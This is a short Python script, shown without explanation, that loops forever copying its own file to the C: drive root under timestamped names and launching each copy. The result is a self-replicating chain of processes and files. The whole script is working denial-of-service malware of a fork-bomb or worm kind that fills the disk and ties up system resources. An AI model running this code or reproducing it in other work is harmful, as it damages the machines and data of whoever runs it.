import os
import shutil
import time
import subprocess

while True:
    new_file_name = f"{__file__}_{time.strftime('%Y-%m-%d_%H-%M-%S', time.gmtime())}"
    shutil.copy(__file__, f"C:\\{new_file_name}")
    # specify the path of the other file you want to run
    other_file = f"C:\\{new_file_name}"
    subprocess.run(["python", other_file])
    time.sleep(0)
